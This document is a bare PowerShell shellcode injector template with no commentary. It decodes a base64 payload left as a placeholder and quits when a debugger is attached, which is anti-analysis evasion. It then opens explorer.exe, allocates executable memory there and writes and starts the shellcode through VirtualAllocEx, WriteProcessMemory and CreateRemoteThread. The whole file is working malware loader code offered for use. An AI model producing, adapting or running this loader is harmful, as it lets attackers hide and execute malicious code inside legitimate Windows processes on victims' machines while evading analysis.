$encodedShellcode = "add_shell_code_here"

function Decode-Base64 {
    param ([string]$Base64String)
    [System.Convert]::FromBase64String($Base64String)
}

$buf = Decode-Base64 -Base64String $encodedShellcode

function IsDebuggerPresent {
    $IsDebuggerPresentCode = @"
    using System;
    using System.Runtime.InteropServices;

    public class DebugHelper {
        [DllImport("kernel32.dll")]
        public static extern bool IsDebuggerPresent();
    }
"@
    $debugHelper = Add-Type -TypeDefinition $IsDebuggerPresentCode -PassThru
    return $debugHelper::IsDebuggerPresent()
}

if (IsDebuggerPresent) {
    exit
}

$Win32APICode = @"
using System;
using System.Runtime.InteropServices;

public class Win32API {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$win32api = Add-Type -TypeDefinition $Win32APICode -PassThru

$targetProcess = Get-Process explorer | Select-Object -First 1
$processHandle = $win32api::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)

$size = 0x1000
if ($buf.Length -gt $size) { $size = $buf.Length }
$remoteMemory = $win32api::VirtualAllocEx($processHandle, [IntPtr]::Zero, $size, 0x3000, 0x40)

$bytesWritten = [IntPtr]::Zero
$win32api::WriteProcessMemory($processHandle, $remoteMemory, $buf, $buf.Length, [ref]$bytesWritten)

$threadId = [IntPtr]::Zero
$win32api::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $remoteMemory, [IntPtr]::Zero, 0, [ref]$threadId)

$win32api::CloseHandle($processHandle)
